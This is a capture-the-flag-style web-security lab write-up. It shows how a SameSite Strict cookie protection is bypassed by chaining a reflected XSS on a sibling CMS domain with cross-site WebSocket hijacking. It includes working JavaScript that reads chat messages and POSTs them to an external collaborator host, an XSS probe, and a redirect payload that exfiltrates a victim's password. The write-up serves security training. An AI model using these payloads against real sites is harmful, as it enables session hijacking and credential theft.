# Lab: SameSite Strict bypass via sibling domain

## Lab Description

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/40b4a795-6858-4e99-ad9f-18cbcb468ab2)

## Solution

The given website has live chat feature.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/dfa634f8-c044-43ec-abf7-117cd61d626b)

The chat is requested usin a get method and don't have any unpredictable tokens like csrf.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/da9608d3-d34a-4eb8-9572-46a91e6d4718)

In websocket history we can see the client sends a `READY` message to server before starting or fetching the chat history.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/8359aef0-72d5-481e-afa9-6c4ff7a05e6d)

Go to burp collaborator and click `Copy to clipboard`.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/272ee3c9-2f3a-4294-ba7f-d8ea85f3ad08)

Enter the following script in the body section of the exploit server and click on **Store** and **View exploit**.

```Javascript
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/a18a706d-d495-4c2e-a2b7-680716f8bcf1)

In collaborator we can see a new chat session has begun.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/da85970e-bc00-4efe-8bf9-db063ee737d3)

The new chat session that started has `SameSite` attribute set to `strict`.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/6ebcada9-1772-47b4-960a-8e2a802950df)

If we furthur inspect the webpage, responses to requests for resources like script and image files contain an `Access-Control-Allow-Origin` header, which reveals a sibling domain at `cms-YOUR-LAB-ID.web-security-academy.net`.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/38f0e057-7bdd-42a9-89ab-464722c816da)

When going to the sibling domain we are present with a login page.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/7cae74b2-caa3-41aa-bfaf-2e6b97af15e0)

Check to see if the login page has a XSS vulnerability by giving username as `<script>alert(420)</script>` which is proven to be true.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/9c0e41d3-32b4-4141-9747-8dd94dc3402f)

URL encode the Javascript script used in exploit server and url encode it using **burp decoder**.
![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/9e75417d-26b3-4e6c-9ece-cd4ceaf101f6)

Use the following script in body of the exploit server and deliver it to victim.

```javaScript
<script>
    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
</script>
```

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/fdcb7bd5-56da-4cf9-aafa-82401eab7e2d)

We recieve a number of new HTTP interactions in collaborator. On inspecting one of them has password for user `carlos`

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/56c861f1-e7f4-4d24-9a38-ef3537876edf)

Use the password from above and username as `carlos` to login as carlos and finish the lab.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/8115cf58-8173-462d-a132-f91a0116cd91)
